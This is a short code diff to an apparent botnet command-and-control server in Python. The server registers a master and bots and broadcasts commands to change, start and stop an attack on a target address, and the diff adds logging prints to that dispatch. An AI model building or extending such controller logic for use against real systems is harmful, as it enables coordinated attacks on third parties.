@@ -81,10 +81,10 @@ class Server():
         try:
             sock_addr = sock.getpeername()
             recv_data = sock.recv(RECV_BUFFER).decode(ENCODING)
-            print(f'received request from ${sock_addr}')
             if recv_data:
                 try:
                     req_type, req_body = recv_data.split(':')
+                    print(f'received {req_type} request from ${sock_addr}')
                     # iam request applies to both master and bot agent
                     if req_type == 'iam':
                         self._iam_handler(sock, req_body)
@@ -154,6 +154,7 @@ class Server():
         elif type == 'changeattk':
             self._bot_broadcast(f'changeattk:{body}'.encode(ENCODING))
             self.attk_type = body
+            print(f'Attack type is: {self.attk_type}')
             return
         elif type == 'startattk':
             if not self.target_address:
@@ -166,6 +167,7 @@ class Server():
                 self._bot_broadcast('startattk:True'.encode(ENCODING))
                 self.attacking = True
                 response = 'startattk:success:started attack'
+                print("starting attack")
         elif type == 'stopattk':
             if not self.target_address or not self.attacking or not self.attk_type:
                 response = 'stopattk:error:no attack in progress'
@@ -173,6 +175,7 @@ class Server():
                 self._bot_broadcast('stopattk:True'.encode(ENCODING))
                 self.attacking = False
                 response = 'stopattk:success:stopped attack'
+                print("stopping attack")
         else:
             response = f'{type}:error:unknown command'
 
